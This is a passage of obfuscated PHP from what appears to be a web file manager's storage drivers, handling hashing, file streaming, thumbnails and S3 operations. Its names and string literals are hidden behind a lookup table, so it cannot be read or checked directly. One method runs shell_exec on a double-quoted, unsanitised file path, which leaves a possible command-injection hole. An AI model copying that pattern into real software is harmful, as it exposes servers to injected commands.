$∆˛öóÆ◊ .= $this->fileSubstr($ áÎƒ°€, $∏ªˆÀ◊Ç * $◊Éä‘êà, $ÖäÜ¯π›); } $∆˛öóÆ◊ .= $this->fileSubstr($ áÎƒ°€, $∑±ùÔ’ô - $ÖäÜ¯π›, $ÖäÜ¯π›); return md5($∆˛öóÆ◊) . $∑±ùÔ’ô; } public static $md5Cache = array(); public function hashMd5($À¯≠Ùñª) { if (!$À¯≠Ùñª) { return md5($_SERVER[Çâä∆◊¡][12]); } $À¯≠Ùñª = $this->iconvSystem($À¯≠Ùñª); if (isset(self::$md5Cache[$À¯≠Ùñª])) { return self::$md5Cache[$À¯≠Ùñª]; } self::$md5Cache[$À¯≠Ùñª] = $this->hashMd5Shell($À¯≠Ùñª); if (!self::$md5Cache[$À¯≠Ùñª]) { self::$md5Cache[$À¯≠Ùñª] = @md5_file($À¯≠Ùñª); } return self::$md5Cache[$À¯≠Ùñª]; } private function hashMd5Shell($éºé”¢ ) { $¬∑∏ÈÕ˛ =& $_SERVER[Çâä∆◊¡]; if (!$éºé”¢ ) { return md5($¬∑∏ÈÕ˛[12]); } if (!function_exists($¬∑∏ÈÕ˛[99])) { return !1; } $é„…î≥É = array($¬∑∏ÈÕ˛[100], $¬∑∏ÈÕ˛[101]); $£¯ﬂÖ÷É = Cache::get($¬∑∏ÈÕ˛[102]); if (!$£¯ﬂÖ÷É) { $Ù¢¡º°È = BASIC_PATH . $¬∑∏ÈÕ˛[103]; $•˝ÊÃæ§ = md5_file($Ù¢¡º°È); $£¯ﬂÖ÷É = $¬∑∏ÈÕ˛[104]; foreach ($é„…î≥É as $ïªøá•ò) { $∞Ÿ◊ììô = shell_exec($ïªøá•ò . "\x20\42{$Ù¢¡º°È}\x22"); if ($∞Ÿ◊ììô && substr(trim($∞Ÿ◊ììô), 0, 32) == $•˝ÊÃæ§) { $£¯ﬂÖ÷É = $ïªøá•ò; break; } } Cache::set($¬∑∏ÈÕ˛[102], $£¯ﬂÖ÷É, 3600); } if ($£¯ﬂÖ÷É == $¬∑∏ÈÕ˛[104]) { return !1; } $∞Ÿ◊ììô = shell_exec($£¯ﬂÖ÷É . "\x20\42{$éºé”¢ }\x22"); $∞Ÿ◊ììô = str_replace($¬∑∏ÈÕ˛[105], $¬∑∏ÈÕ˛[12], $∞Ÿ◊ììô); return substr($∞Ÿ◊ììô, 0, 32); } public function link($ë∂ÎÕæ˛) { return $ë∂ÎÕæ˛; } public function fileOut($ñˆ¯∞™ú, $äòÇÂÀá = false, $√Õµ±≈É = false, $£˜˙‰∞≈ = '') { $∑™ôï±¢ =& $_SERVER[Çâä∆◊¡]; $this->cacheMethod(null, null); if (!$ñˆ¯∞™ú || !$this->exist($ñˆ¯∞™ú)) { show_json(LNG($∑™ôï±¢[106]), !1, $√Õµ±≈É); } $¬ìäÀ‹ñ = $this->getType() == $∑™ôï±¢[107]; $†à∫≠∏ø = $GLOBALS[$∑™ôï±¢[6]][$∑™ôï±¢[90]][$∑™ôï±¢[108]][$∑™ôï±¢[109]]; $ã—ö›†Ô = (double) $GLOBALS[$∑™ôï±¢[6]][$∑™ôï±¢[90]][$∑™ôï±¢[108]][$∑™ôï±¢[110]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ïÆ¢Ÿæ’ = $this->infoFull($ñˆ¯∞™ú); $ºÍ˝ÂèÛ = $ïÆ¢Ÿæ’[$∑™ôï±¢[80]]; $·Â´‘∫⁄ = gmdate($∑™ôï±¢[111], $ïÆ¢Ÿæ’[$∑™ôï±¢[86]]); $·≈±î«√ = $√Õµ±≈É ? $√Õµ±≈É : $this->iconvApp($ïÆ¢Ÿæ’[$∑™ôï±¢[32]]); $®©—ÅÍ« = 0; $ ⁄≥É≤  = $ºÍ˝ÂèÛ - 1; $œúÏΩŸá = $this->ext($·≈±î«√); if (in_array($œúÏΩŸá, array($∑™ôï±¢[112], $∑™ôï±¢[113], $∑™ôï±¢[114], $∑™ôï±¢[115]))) { $œúÏΩŸá = $∑™ôï±¢[116]; } if (!$£˜˙‰∞≈) { $£˜˙‰∞≈ = md5($·Â´‘∫⁄ . $this->hashSimple($ñˆ¯∞™ú)); } $£˜˙‰∞≈ = $∑™ôï±¢[117] . $£˜˙‰∞≈ . $∑™ôï±¢[117]; $óıâ…≤© = get_file_mime($œúÏΩŸá); if ($äòÇÂÀá === !1 && !mime_support($óıâ…≤©)) { $äòÇÂÀá = !0; $óıâ…≤© = $∑™ôï±¢[118]; } header($∑™ôï±¢[119]); header($∑™ôï±¢[120] . $óıâ…≤©); $ÕÏ¥Ê˙º = rawurlencode($·≈±î«√); $ÕÏ¥Ê˙º = $∑™ôï±¢[117] . $ÕÏ¥Ê˙º . $∑™ôï±¢[121] . $ÕÏ¥Ê˙º; if ($äòÇÂÀá) { header($∑™ôï±¢[122]); header($∑™ôï±¢[123] . $ÕÏ¥Ê˙º); } else { } header($∑™ôï±¢[124] . gmdate($∑™ôï±¢[111], time() + 3600 * 24 * 30) . $∑™ôï±¢[125]); header($∑™ôï±¢[126]); header($∑™ôï±¢[127]); header($∑™ôï±¢[128]); if (isset($_SERVER[$∑™ôï±¢[129]]) && strtotime($_SERVER[$∑™ôï±¢[129]]) == $ïÆ¢Ÿæ’[$∑™ôï±¢[86]]) { header($∑™ôï±¢[130], !0, 304); die; } if (isset($_SERVER[$∑™ôï±¢[131]]) && $_SERVER[$∑™ôï±¢[131]] == $£˜˙‰∞≈) { header($∑™ôï±¢[132] . $£˜˙‰∞≈, !0, 304); die; } header($∑™ôï±¢[132] . $£˜˙‰∞≈); header($∑™ôï±¢[133] . $·Â´‘∫⁄ . $∑™ôï±¢[125]); header($∑™ôï±¢[134] . $·≈±î«√); header($∑™ôï±¢[135]); header($∑™ôï±¢[136] . $ºÍ˝ÂèÛ); header($∑™ôï±¢[137]); if (!$äòÇÂÀá && $œúÏΩŸá == $∑™ôï±¢[138]) { if ($ºÍ˝ÂèÛ > 1024 * 1024 * 5) { die; } $Îâ´≈ïÃ = $this->getContent($ñˆ¯∞™ú); $Îâ´≈ïÃ = Html::clearSVG($Îâ´≈ïÃ); header($∑™ôï±¢[139] . strlen($Îâ´≈ïÃ)); echo $Îâ´≈ïÃ; die; } $˘ëÅÚÒë = strtolower($_SERVER[$∑™ôï±¢[140]]); if ($¬ìäÀ‹ñ && $˘ëÅÚÒë && $†à∫≠∏ø) { if (strstr($˘ëÅÚÒë, $∑™ôï±¢[141])) { header($∑™ôï±¢[142] . $ñˆ¯∞™ú); } else { if (strstr($˘ëÅÚÒë, $∑™ôï±¢[143])) { header($∑™ôï±¢[144] . $ñˆ¯∞™ú); } else { if (strstr($˘ëÅÚÒë, $∑™ôï±¢[145])) { header($∑™ôï±¢[146] . $ñˆ¯∞™ú); } } } if ($ã—ö›†Ô) { header($∑™ôï±¢[147] . $ã—ö›†Ô); } return; } if (isset($_SERVER[$∑™ôï±¢[148]])) { if (preg_match($∑™ôï±¢[149], $_SERVER[$∑™ôï±¢[148]], $»¶Öü˜¿)) { $®©—ÅÍ« = intval($»¶Öü˜¿[1]); if (!empty($»¶Öü˜¿[2])) { $ ⁄≥É≤  = intval($»¶Öü˜¿[2]); } } header($∑™ôï±¢[150]); header("\103\x6f\156\x74\x65\x6e\x74\55\x52\141\x6e\x67\145\72\40\x62\x79\x74\x65\x73\40{$®©—ÅÍ«}\55{$ ⁄≥É≤ }\57" . $ºÍ˝ÂèÛ); } else { header($∑™ôï±¢[151]); } header($∑™ôï±¢[152]); $≈œù‹ª¢ = !0; if ($_SERVER[$∑™ôï±¢[153]] == $∑™ôï±¢[154] && $ºÍ˝ÂèÛ > 1204 * 1024 * 1024 * 2) { $≈œù‹ª¢ = !1; } if ($≈œù‹ª¢) { header($∑™ôï±¢[155] . ($ ⁄≥É≤  - $®©—ÅÍ« + 1)); } if ($_SERVER[$∑™ôï±¢[156]] == $∑™ôï±¢[157]) { return; } $∑√ˆèÁı = 1024 * 100; $ƒÀÂ¶©ø = 0; if ($ã—ö›†Ô) { $ƒÀÂ¶©ø = intval(1000 * 1000 * ($∑√ˆèÁı / $ã—ö›†Ô)); } while ($®©—ÅÍ« <= $ ⁄≥É≤ ) { $ñ∆ÀëÜÁ = timeFloat(); check_abort(); $‚û–é»– = $ ⁄≥É≤  - $®©—ÅÍ« + 1; if ($‚û–é»– <= $∑√ˆèÁı) { $∑√ˆèÁı = $‚û–é»–; } echo $this->fileSubstr($ñˆ¯∞™ú, $®©—ÅÍ«, $∑√ˆèÁı); $®©—ÅÍ« += $∑√ˆèÁı; if ($∑√ˆèÁı == $‚û–é»–) { $®©—ÅÍ« = $ ⁄≥É≤  + 1; } if ($ƒÀÂ¶©ø) { $ÃΩ©Ü≤ = intval(1000 * 1000 * (timeFloat() - $ñ∆ÀëÜÁ)); $·ÒÎú‹¬ = $ƒÀÂ¶©ø - $ÃΩ©Ü≤; if ($·ÒÎú‹¬ > 5) { usleep($·ÒÎú‹¬); } } } } public function fileOutServer($Ÿò§ﬂÑ„, $à™ŒÁ≠ﬁ = false, $ØÚü‰™ﬂ = false, $ˆ‰ÑÊô√ = '') { $this->fileOut($Ÿò§ﬂÑ„, $à™ŒÁ≠ﬁ, $ØÚü‰™ﬂ, $ˆ‰ÑÊô√); } public function fileOutLink($ŸßâÏΩ¢) { header($_SERVER[Çâä∆◊¡][158] . $ŸßâÏΩ¢); die; } public function cacheMethod($•Éﬂ™ﬁ…, $†œ÷ıõ‡, $Í¯£˚˛ù = null) { $˚æ©Óª® =& $_SERVER[Çâä∆◊¡]; static $∏òê”Œ¶ = array(); $ƒô˙⁄ô∆ = $†œ÷ıõ‡ ? ltrim($this->getPathOuter($†œ÷ıõ‡), $˚æ©Óª®[8]) : $†œ÷ıõ‡; $≈†òÈ…ﬂ = $˚æ©Óª®[159] . $•Éﬂ™ﬁ… . $˚æ©Óª®[160] . rtrim($ƒô˙⁄ô∆, $˚æ©Óª®[8]); if (is_null($•Éﬂ™ﬁ…)) { $∏òê”Œ¶ = array(); return; } if (is_null($†œ÷ıõ‡)) { unset($∏òê”Œ¶[$≈†òÈ…ﬂ]); return; } if (!is_null($Í¯£˚˛ù)) { $∏òê”Œ¶[$≈†òÈ…ﬂ] = $Í¯£˚˛ù; return; } $ê‘¿…Õ≤ = isset($∏òê”Œ¶[$≈†òÈ…ﬂ]) ? $∏òê”Œ¶[$≈†òÈ…ﬂ] : null; if (!is_null($ê‘¿…Õ≤)) { return $ê‘¿…Õ≤; } $ê‘¿…Õ≤ = $this->{$•Éﬂ™ﬁ…}($†œ÷ıõ‡); $∏òê”Œ¶[$≈†òÈ…ﬂ] = $ê‘¿…Õ≤; return $ê‘¿…Õ≤; } public function fileOutImage($»ÏëáÆÄ, $¢øÚÓƒä = 250) { $…Òï¡ëè =& $_SERVER[Çâä∆◊¡]; set_timeout(); if (substr($»ÏëáÆÄ, 0, 4) == $…Òï¡ëè[145]) { $this->fileOutLink($»ÏëáÆÄ); } $Ã˘ÈÿøÁ = $this->info($»ÏëáÆÄ); $Ûúé”ºﬁ = $Ã˘ÈÿøÁ[$…Òï¡ëè[32]]; $ØèÎ°Ö∑ = !1; if (isset($GLOBALS[$…Òï¡ëè[161]]) && $GLOBALS[$…Òï¡ëè[161]][$…Òï¡ëè[78]] == $Ã˘ÈÿøÁ[$…Òï¡ëè[78]]) { $¥ùÎ›≥Ú = $GLOBALS[$…Òï¡ëè[161]][$…Òï¡ëè[162]]; if (!$Ã˘ÈÿøÁ[$…Òï¡ëè[163]]) { $Ã˘ÈÿøÁ[$…Òï¡ëè[163]] = $GLOBALS[$…Òï¡ëè[161]]; } if (isset($¥ùÎ›≥Ú[$…Òï¡ëè[164]])) { if ($¥ùÎ›≥Ú[$…Òï¡ëè[164]] <= $¢øÚÓƒä && $¥ùÎ›≥Ú[$…Òï¡ëè[165]] <= $¢øÚÓƒä) { $ØèÎ°Ö∑ = !0; } } $Ûúé”ºﬁ = $Ã˘ÈÿøÁ[$…Òï¡ëè[163]][$…Òï¡ëè[32]]; } if ($Ã˘ÈÿøÁ[$…Òï¡ëè[80]] <= 1024 * 50 || $ØèÎ°Ö∑ || !function_exists($…Òï¡ëè[166]) || $Ã˘ÈÿøÁ[$…Òï¡ëè[167]] == $…Òï¡ëè[168]) { return $this->fileOut($»ÏëáÆÄ, !1, $Ûúé”ºﬁ); } if (isset($Ã˘ÈÿøÁ[$…Òï¡ëè[163]][$…Òï¡ëè[169]])) { $öµô´Ó“ = $Ã˘ÈÿøÁ[$…Òï¡ëè[163]][$…Òï¡ëè[169]]; } else { if (isset($Ã˘ÈÿøÁ[$…Òï¡ëè[163]][$…Òï¡ëè[170]])) { $öµô´Ó“ = $Ã˘ÈÿøÁ[$…Òï¡ëè[163]][$…Òï¡ëè[170]]; } else { $öµô´Ó“ = md5("{$Ã˘ÈÿøÁ[$…Òï¡ëè[32]]}\137{$Ã˘ÈÿøÁ[$…Òï¡ëè[78]]}\137{$Ã˘ÈÿøÁ[$…Òï¡ëè[80]]}"); } } $µÛ˚Çˆ» = "{$öµô´Ó“}\137{$¢øÚÓƒä}\56\160\156\147"; if (!($áãˆ‹ÆÒ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $…Òï¡ëè[171]))) { $ê™í≈®Ó = IO::mkdir(IO_PATH_SYSTEM_TEMP . $…Òï¡ëè[172]); } else { $ê™í≈®Ó = KodIO::make($áãˆ‹ÆÒ); } if ($áãˆ‹ÆÒ = IO::fileNameExist($ê™í≈®Ó, $µÛ˚Çˆ»)) { $˜⁄’Á≥ò = KodIO::make($áãˆ‹ÆÒ); return IO::fileOut($˜⁄’Á≥ò, !1, $Ûúé”ºﬁ); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $˜⁄’Á≥ò = DATA_THUMB . $µÛ˚Çˆ»; del_file($˜⁄’Á≥ò); if (!@file_exists($˜⁄’Á≥ò)) { $…µü˜Ò„ = TEMP_FILES; if (!is_dir($…µü˜Ò„)) { mk_dir($…µü˜Ò„); } $¯¶˜¢üÜ = $…µü˜Ò„ . $öµô´Ó“ . $…Òï¡ëè[10] . $Ã˘ÈÿøÁ[$…Òï¡ëè[167]]; if (!@file_exists($¯¶˜¢üÜ)) { $¯¶˜¢üÜ = $this->download($»ÏëáÆÄ, $¯¶˜¢üÜ); } ImageThumb::createThumb($¯¶˜¢üÜ, $˜⁄’Á≥ò, $¢øÚÓƒä, $¢øÚÓƒä * 10); } if (!file_exists($˜⁄’Á≥ò) || filesize($˜⁄’Á≥ò) < 100) { return @file_exists($¯¶˜¢üÜ) ? IO::fileOut($¯¶˜¢üÜ) : $this->fileOut($»ÏëáÆÄ); } if (!($ﬂØ˚£ı¯ = IO::move($˜⁄’Á≥ò, $ê™í≈®Ó))) { return IO::fileOut($˜⁄’Á≥ò); } del_file($˜⁄’Á≥ò); IO::fileOut($ﬂØ˚£ı¯); } public function fileOutImageServer($ÿÕ›∆πò, $πÑÉ∑Ñ∆ = 250) { $this->fileOutImage($ÿÕ›∆πò, $πÑÉ∑Ñ∆); } public function fileNameAuto($˘ÃÔ¥≠ç, $∞»á£∫Ã, $∆®≥¡≠À = REPEAT_RENAME, $»Ôùﬂó∆ = false) { $Ô¿”≠Üé =& $_SERVER[Çâä∆◊¡]; $‹Éï•í˜ = $˘ÃÔ¥≠ç === $Ô¿”≠Üé[12] ? $∞»á£∫Ã : rtrim($˘ÃÔ¥≠ç, $Ô¿”≠Üé[8]) . $Ô¿”≠Üé[8] . $∞»á£∫Ã; if ($∆®≥¡≠À == REPEAT_REPLACE || !$this->exist($‹Éï•í˜) || $»Ôùﬂó∆ && $∆®≥¡≠À != REPEAT_RENAME_FOLDER) { return $∞»á£∫Ã; } if ($∆®≥¡≠À == REPEAT_SKIP) { return !1; } $ı£◊ö£Ä = $Ô¿”≠Üé[10] . get_path_ext($∞»á£∫Ã); $ı£◊ö£Ä = $ı£◊ö£Ä == $Ô¿”≠Üé[10] || $»Ôùﬂó∆ ? $Ô¿”≠Üé[12] : $ı£◊ö£Ä; $’ÏÍ®–≥ = 1; $ƒ¨ã˜ÓË = substr($∞»á£∫Ã, 0, strlen($∞»á£∫Ã) - strlen($ı£◊ö£Ä)); $Î≥˚…ËÉ = $ƒ¨ã˜ÓË . "\x28{$’ÏÍ®–≥}\51{$ı£◊ö£Ä}"; while ($this->exist(rtrim($˘ÃÔ¥≠ç, $Ô¿”≠Üé[8]) . $Ô¿”≠Üé[8] . $Î≥˚…ËÉ)) { $Î≥˚…ËÉ = $ƒ¨ã˜ÓË . "\50{$’ÏÍ®–≥}\51{$ı£◊ö£Ä}"; $’ÏÍ®–≥++; } return $Î≥˚…ËÉ; } private function fileNameAutoList($•„’ŒÍ£, $¯∂Ñøûã, $Í‘é≤·ú = false) { $≈úíöÌ≈ =& $_SERVER[Çâä∆◊¡]; $´”◊Òä¿ = $this->listPath($•„’ŒÍ£, !0); $´”◊Òä¿ = array_merge($´”◊Òä¿[$≈úíöÌ≈[77]], $´”◊Òä¿[$≈úíöÌ≈[76]]); $ﬂ÷≤Ö“¸ = array_to_keyvalue($´”◊Òä¿, $≈úíöÌ≈[12], $≈úíöÌ≈[32]); $âÉ˚€øå = $≈úíöÌ≈[10] . get_path_ext($¯∂Ñøûã); $âÉ˚€øå = $âÉ˚€øå == $≈úíöÌ≈[10] || $Í‘é≤·ú ? $≈úíöÌ≈[12] : $âÉ˚€øå; $¥®§ÛÑµ = substr($¯∂Ñøûã, 0, strlen($¯∂Ñøûã) - strlen($âÉ˚€øå)); $Ò⁄◊¸ãè = $¥®§ÛÑµ . "\50\x30\x29{$âÉ˚€øå}"; for ($°˝ÜÓ≈» = 1; $°˝ÜÓ≈» <= count($ﬂ÷≤Ö“¸) + 1; $°˝ÜÓ≈»++) { $Ò⁄◊¸ãè = $¥®§ÛÑµ . "\50{$°˝ÜÓ≈»}\51{$âÉ˚€øå}"; if (!in_array_not_case($Ò⁄◊¸ãè, $ﬂ÷≤Ö“¸)) { return $Ò⁄◊¸ãè; } } return $Ò⁄◊¸ãè; } public function listAllFiles($§ π∂˜ , $”í…Äåƒ, $Ô˘øÓ©Ú = array()) { $Ü◊êËññ =& $_SERVER[Çâä∆◊¡]; if (empty($”í…Äåƒ)) { return array(); } $Ù∫¶¨ÂÒ = array(); $§ π∂˜  = trim($§ π∂˜ , $Ü◊êËññ[8]); foreach ($”í…Äåƒ as $«—Ó´æº) { $€Ø∏©˝ü = ltrim(substr(trim($«—Ó´æº, $Ü◊êËññ[8]), strlen($§ π∂˜ )), $Ü◊êËññ[8]); $Ù∫¶¨ÂÒ = array_merge($Ù∫¶¨ÂÒ, $this->slicePath($€Ø∏©˝ü)); } $˜˚∫⁄Î£ = array(); foreach (array_unique($Ù∫¶¨ÂÒ) as $«—Ó´æº) { $ã‘∏üì´ = array($Ü◊êËññ[78] => $this->getPathOuter($Ü◊êËññ[8] . $§ π∂˜  . $Ü◊êËññ[8] . $«—Ó´æº), $Ü◊êËññ[79] => 1, $Ü◊êËññ[80] => 0); if (substr($«—Ó´æº, -1) != $Ü◊êËññ[8]) { $ã‘∏üì´[$Ü◊êËññ[79]] = 0; $¿†„…–” = $this->getPath($§ π∂˜  . $Ü◊êËññ[8] . $«—Ó´æº); $ã‘∏üì´[$Ü◊êËññ[80]] = isset($Ô˘øÓ©Ú[$¿†„…–”]) ? $Ô˘øÓ©Ú[$¿†„…–”] : $this->size($¿†„…–”); } $˜˚∫⁄Î£[] = $ã‘∏üì´; } return $˜˚∫⁄Î£; } public function slicePath($Ã—ﬂ¸î—) { $ª∂ùòÀñ =& $_SERVER[Çâä∆◊¡]; $ú¢øÇï÷ = explode($ª∂ùòÀñ[8], trim($Ã—ﬂ¸î—, $ª∂ùòÀñ[8])); $ùù∏¨È¿ = 0; do { ++$ùù∏¨È¿; $ÓÅÛç∆õ[] = implode($ª∂ùòÀñ[8], array_slice($ú¢øÇï÷, 0, $ùù∏¨È¿)) . $ª∂ùòÀñ[8]; } while ($ùù∏¨È¿ < count($ú¢øÇï÷)); $ÓÅÛç∆õ[count($ú¢øÇï÷) - 1] = $Ã—ﬂ¸î—; return $ÓÅÛç∆õ; } public function getHost() { $◊®””ú¨ =& $_SERVER[Çâä∆◊¡]; $˛ëçüÈ˙ = parse_url(trim($this->domain, $◊®””ú¨[8])); $ôı‚¿ª€ = isset($˛ëçüÈ˙[$◊®””ú¨[173]]) ? $˛ëçüÈ˙[$◊®””ú¨[173]] : http_type(); $∞÷Â¥‹Á = isset($˛ëçüÈ˙[$◊®””ú¨[174]]) ? $˛ëçüÈ˙[$◊®””ú¨[174]] : $˛ëçüÈ˙[$◊®””ú¨[78]]; if (isset($˛ëçüÈ˙[$◊®””ú¨[175]])) { $∞÷Â¥‹Á .= $◊®””ú¨[4] . $˛ëçüÈ˙[$◊®””ú¨[175]]; } return $ôı‚¿ª€ . $◊®””ú¨[176] . $∞÷Â¥‹Á; } public function pathEncode($Õ¯€¸óá) { $∞ﬂÓ≥¨π =& $_SERVER[Çâä∆◊¡]; return str_replace($∞ﬂÓ≥¨π[177], $∞ﬂÓ≥¨π[8], rawurlencode($Õ¯€¸óá)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($¥œ€Áøû) { set_timeout(); require_once SDK_DIR . $_SERVER[Çâä∆◊¡][178]; parent::__construct(); $this->_init($¥œ€Áøû); } public function _init($¡Ä‡˝Á†) { foreach ($¡Ä‡˝Á† as $õ©ΩÈ†â => $∫≤–ñˆØ) { if (isset($this->{$õ©ΩÈ†â})) { $this->{$õ©ΩÈ†â} = $∫≤–ñˆØ; } } $this->endpoint = $¡Ä‡˝Á†[$_SERVER[Çâä∆◊¡][179]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($∑ƒ…Ûº— = "\x76\x34") { $this->signVer = $∑ƒ…Ûº—; $this->client->setSignatureVersion($∑ƒ…Ûº—); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $À¥Ì´ªË =& $_SERVER[Çâä∆◊¡]; $ﬂ ≠á∏Œ = $this->getBucketCors(); if (!$ﬂ ≠á∏Œ || !is_array($ﬂ ≠á∏Œ)) { return !1; } if ($ﬂ ≠á∏Œ[$À¥Ì´ªË[180]] != $À¥Ì´ªË[181] || $ﬂ ≠á∏Œ[$À¥Ì´ªË[182]] != $À¥Ì´ªË[181]) { return !1; } $ÁÑ°Ÿ˜Á = array_map($À¥Ì´ªË[183], $ﬂ ≠á∏Œ[$À¥Ì´ªË[184]]); if (!is_array($ÁÑ°Ÿ˜Á)) { $ÁÑ°Ÿ˜Á = array(); } $¢Äπ§›˛ = array($À¥Ì´ªË[185], $À¥Ì´ªË[186], $À¥Ì´ªË[187], $À¥Ì´ªË[188], $À¥Ì´ªË[189]); $∆•ñêÒè = array_diff($¢Äπ§›˛, $ÁÑ°Ÿ˜Á); return empty($∆•ñêÒè); } public function mkfile($Òâ√ìøŒ, $»ï“äà⁄ = '', $¬ŸË‰ºµ = REPEAT_RENAME) { $‹ƒÍ™”— = $this->setContent($Òâ√ìøŒ, $»ï“äà⁄); if ($‹ƒÍ™”— !== !1) { return $this->getPathOuter($Òâ√ìøŒ); } return !1; } public function mkdir($ÜºÒÄ÷¿, $§ΩÚ…¥Ì = REPEAT_SKIP) { $µ≥√ÃÀ≠ =& $_SERVER[Çâä∆◊¡]; if (empty($ÜºÒÄ÷¿) && $ÜºÒÄ÷¿ !== $µ≥√ÃÀ≠[190]) { return !1; } if ($this->_isFolder($ÜºÒÄ÷¿)) { return $this->getPathOuter($ÜºÒÄ÷¿); } $—§ãØ∑˛ = $this->setContent($ÜºÒÄ÷¿, $µ≥√ÃÀ≠[12], !0); if ($—§ãØ∑˛ !== !1) { return $this->getPathOuter($ÜºÒÄ÷¿); } return !1; } public function copyFile($ÃÑ©˘äﬂ, $øòçÈƒÓ, $ëñµ•∂¨ = array()) { $‘ÿò°ã¨ =& $_SERVER[Çâä∆◊¡]; $â¬ø©ﬁÿ = $this->objectMeta($ÃÑ©˘äﬂ); if (!$â¬ø©ﬁÿ) { return !1; } if ($â¬ø©ﬁÿ[$‘ÿò°ã¨[80]] <= 1024 * 1024 * 200) { $“Ãˆπê’ = $this->client->copyObject($this->bucket, $ÃÑ©˘äﬂ, $this->bucket, $øòçÈƒÓ, $‘ÿò°ã¨[191], $ëñµ•∂¨); } else { $“Ãˆπê’ = $this->client->multiCopyObject($this->bucket, $ÃÑ©˘äﬂ, $this->bucket, $øòçÈƒÓ, $ëñµ•∂¨); } $“Ãˆπê’ = $“Ãˆπê’ ? $this->getPathOuter($øòçÈƒÓ) : !1; return $“Ãˆπê’; } public function moveFile($÷‰„˝áö, $–ÓıÕÊ) { if ($this->copyFile($÷‰„˝áö, $–ÓıÕÊ)) { $this->delFile($÷‰„˝áö); return $this->getPathOuter($–ÓıÕÊ); } return !1; } public function delFile($ÅÖπä“ﬂ) { return $this->client->deleteObject($this->bucket, $ÅÖπä“ﬂ); } public function delFolder($©⁄Ùªí°) { $ÖôÓò˘é =& $_SERVER[Çâä∆◊¡]; if (!$this->exist($©⁄Ùªí°)) { return !0; } $this->listItemCache = !1; $≥ œ¸ü€ = $this->fileList($©⁄Ùªí°); $this->listItemCache = !0; $◊¯¯È˚ = trim($©⁄Ùªí°, $ÖôÓò˘é[8]) . $ÖôÓò˘é[8]; if (!empty($©⁄Ùªí°) && $©⁄Ùªí° !== $ÖôÓò˘é[190] && !in_array($◊¯¯È˚, $≥ œ¸ü€[$ÖôÓò˘é[77]])) { $≥ œ¸ü€[$ÖôÓò˘é[77]][] = $◊¯¯È˚; } $œ˝éÂ‡» = $this->delByBatch($≥ œ¸ü€[$ÖôÓò˘é[76]]); if (!$œ˝éÂ‡») { return !1; } $œ˝éÂ‡» = $this->delByBatch($≥ œ¸ü€[$ÖôÓò˘é[77]]); if (!$œ˝éÂ‡») { return !1; } return $this->delFile($◊¯¯È˚); } private function delByBatch($≥“ÁÿΩ) { foreach (array_chunk($≥“ÁÿΩ, 1000) as $Ò≤≈ûÔ≈) { $ Á‰â¯ú = $this->client->deleteObjects($this->bucket, $Ò≤≈ûÔ≈); if (!$ Á‰â¯ú) { return !1; } } return !0; } public function rename($ü»èóì÷, $Îÿ≤›ú∫) { return $this->renameObject($ü»èóì÷, $Îÿ≤›ú∫); } public function listPath($⁄£é•ëï, $Â∂ìÌ‰ë = false) { $˝≈Øˆ∆Ì =& $_SERVER[Çâä∆◊¡]; $πñ¢ÉòÔ = $this->fileList($⁄£é•ëï, $˝≈Øˆ∆Ì[8], !0); foreach ($πñ¢ÉòÔ[$˝≈Øˆ∆Ì[77]] as $ÅÎË‚ÿ∫ => $«Æâ√˘ﬂ) { $πñ¢ÉòÔ[$˝≈Øˆ∆Ì[77]][$ÅÎË‚ÿ∫] = $this->folderInfo($«Æâ√˘ﬂ, $Â∂ìÌ‰ë); } foreach ($πñ¢ÉòÔ[$˝≈Øˆ∆Ì[76]] as $ÅÎË‚ÿ∫ => $«Æâ√˘ﬂ) { $πñ¢ÉòÔ[$˝≈Øˆ∆Ì[76]][$ÅÎË‚ÿ∫] = $this->fileInfo($«Æâ√˘ﬂ[$˝≈Øˆ∆Ì[32]], $Â∂ìÌ‰ë, $«Æâ√˘ﬂ); } return $πñ¢ÉòÔ; } private function fileInfo($≈Ùı Ï¿, $Ÿ˛–ó‰ = false, $˛ÓÅœï = array()) { $≈π≥ØÇø =& $_SERVER[Çâä∆◊¡]; $˜ó›∏ˆ∑ = array($≈π≥ØÇø[32] => $this->pathThis($≈Ùı Ï¿), $≈π≥ØÇø[78] => $this->getPathOuter($≈Ùı Ï¿), $≈π≥ØÇø[33] => $≈π≥ØÇø[192], $≈π≥ØÇø[167] => $this->ext($≈Ùı Ï¿), $≈π≥ØÇø[80] => isset($˛ÓÅœï[$≈π≥ØÇø[80]]) ? $˛ÓÅœï[$≈π≥ØÇø[80]] : 0); if ($Ÿ˛–ó‰) { return $˜ó›∏ˆ∑; } $˜ó›∏ˆ∑[$≈π≥ØÇø[193]] = $˜ó›∏ˆ∑[$≈π≥ØÇø[86]] = 0; $˜ó›∏ˆ∑[$≈π≥ØÇø[194]] = $˜ó›∏ˆ∑[$≈π≥ØÇø[195]] = !0; if (empty($˛ÓÅœï)) { $˛ÓÅœï = $this->objectMeta($≈Ùı Ï¿); if (!$˛ÓÅœï) { return $˜ó›∏ˆ∑; } } if (isset($˛ÓÅœï[$≈π≥ØÇø[196]])) { $˜ó›∏ˆ∑[$≈π≥ØÇø[86]] = $˛ÓÅœï[$≈π≥ØÇø[196]]; } if (isset($˛ÓÅœï[$≈π≥ØÇø[80]])) { $˜ó›∏ˆ∑[$≈π≥ØÇø[80]] = $˛ÓÅœï[$≈π≥ØÇø[80]]; } return $˜ó›∏ˆ∑; } private function folderInfo($˛õÈÅﬂî, $Äó›…ü– = false) { $ŒÀ‹éØŒ =& $_SERVER[Çâä∆◊¡]; $âñ√†…ò = array($ŒÀ‹éØŒ[32] => $this->pathThis($˛õÈÅﬂî), $ŒÀ‹éØŒ[78] => $this->getPathOuter($ŒÀ‹éØŒ[8] . $˛õÈÅﬂî), $ŒÀ‹éØŒ[33] => $ŒÀ‹éØŒ[79]); if ($Äó›…ü–) { return $âñ√†…ò; } $âñ√†…ò[$ŒÀ‹éØŒ[193]] = 